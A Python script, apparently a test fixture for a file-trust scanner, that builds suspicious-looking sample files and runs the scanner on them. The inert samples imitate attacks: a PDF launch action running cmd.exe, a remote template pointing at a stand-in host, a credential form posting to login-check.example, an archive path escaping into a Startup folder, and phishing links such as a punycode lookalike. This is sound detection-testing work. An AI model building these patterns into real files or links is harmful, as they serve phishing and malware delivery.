

import io
import sys
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
OUT = ROOT / "samples"
sys.path.insert(0, str(ROOT.parent / "src"))


def pe() -> bytes:
    dos = bytearray(b"MZ" + b"\x00" * 62)
    dos[0x3C:0x40] = (0x40).to_bytes(4, "little")
    coff = (b"PE\0\0" + (0x14C).to_bytes(2, "little") + (1).to_bytes(2, "little")
            + b"\0" * 12 + (0xE0).to_bytes(2, "little") + (0x0102).to_bytes(2, "little"))
    opt = (0x10B).to_bytes(2, "little") + b"\0" * 0xDE
    return bytes(dos) + coff + opt + b".text\0\0\0" + b"\0" * 32 + b"\0" * 512


def zipb(files: dict) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in files.items():
            z.writestr(n, d)
    return b.getvalue()


def office(extra=None) -> bytes:
    parts = {
        "[Content_Types].xml": b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        "_rels/.rels": b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
        "word/document.xml": b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>',
    }
    parts.update(extra or {})
    return zipb(parts)


def pdf(body: bytes = b"") -> bytes:
    return (b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
            b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n" + body + b"\n%%EOF\n")


REL = (b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
       b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
       b'Target="http://updates-check.example/t.dotm" TargetMode="External"/></Relationships>')

# (ім'я файлу, вміст, що очікуємо)
SAMPLES = [
    ("01_report.pdf", pdf(), "🟢"),
    ("02_meeting_notes.docx", office(), "🟢"),
    ("03_invoice.pdf.exe", pe(), "🔴"),
    ("04_photo.jpg", pe(), "🔴"),
    ("05_resume.pdf", pdf(b"3 0 obj\n<< /S /Launch /F (cmd.exe) >>\nendobj"), "🔴"),
    ("06_contract.docx", office({"word/vbaProject.bin": b"macro-placeholder"}), "🔴"),
    ("07_login.html", b"<html><body><form action='https://login-check.example/p' method='post'>"
        b"<input type='text' name='user'><input type='password' name='pass'></form></body></html>", "🟡/🔴"),
    ("08_documents.zip", zipb({"readme.txt": b"see attached", "setup.exe": pe()}), "🔴"),
    ("09_update.docx", office({"word/_rels/settings.xml.rels": REL}), "🟡/🔴"),
    ("10_scan.pdf", pdf(b"3 0 obj\n<< /S /J#61vaScript /JS (app.launchURL\\(1\\)) >>\nendobj"), "🔴"),
    ("11_archive_path.zip", zipb({"../../Startup/run.dll": b"x", "ok.txt": b"y"}), "🟡/🔴"),
]

LINKS = """\
https://example.com/docs
https://bit.ly/3xYz
http://192.168.1.15/login
http://xn--pypal-4ve.com/signin
https://paypal.com.account-verify.example/login
https://google.com@evil.example/
https://example.com/setup.exe
"""


def main():
    OUT.mkdir(exist_ok=True)
    for name, data, _ in SAMPLES:
        (OUT / name).write_bytes(data)
    (OUT / "links.txt").write_text(LINKS, encoding="utf-8")
    print(f"Створено {len(SAMPLES)} файлів і links.txt у {OUT}")
    if "--check" in sys.argv:
        from filetrust.pipeline import analyze
        from filetrust.scoring.explain import assess
        print(f"\n{'файл':26} {'очікуємо':8} {'ризик':>5}  вердикт")
        for name, _, exp in SAMPLES:
            p = OUT / name
            _, fs = analyze(p, name)
            a = assess(fs)
            print(f"{name:26} {exp:8} {a.total:>5}  {a.verdict}")


if __name__ == "__main__":
    main()
